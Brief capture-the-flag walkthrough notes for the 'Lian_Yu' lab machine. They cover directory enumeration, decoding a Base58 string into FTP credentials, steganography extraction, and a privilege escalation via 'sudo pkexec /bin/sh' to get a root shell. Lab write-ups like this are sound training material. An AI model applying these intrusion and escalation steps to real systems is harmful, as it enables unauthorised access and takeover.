# Lian_Yu
```
export_IP = 10.10.93.97
```

#### Web Enum
```
WORD_LIST = dirbuster-medium-2.3.txt
Enum TOOL = ffuf, gobuster

[Step. 1] : /island
-> vigilante

[Step. 2] : /island/2100

[Step. 3] : /island/2100/green_arrow.ticket
-> RTy8yhBQdscX
```

#### FTP Enum
```
RTy8yhBQdscX -> Base 58 Decode -> !#th3h00d
FTP Credential :  (vigilante,!#th3h00d)
```


#### SSH Enum
```
1. Login Id -> FTP Get
2. Login Password -> aa.zip 
 -> PNG Header Edit file :  Leave_me_alone.png
 -> steghide extract -sf aa.jpg 
```


#### Privilege Escalate
```
$ sudo -l
$ sudo /usr/bin/pkexec /bin/sh
```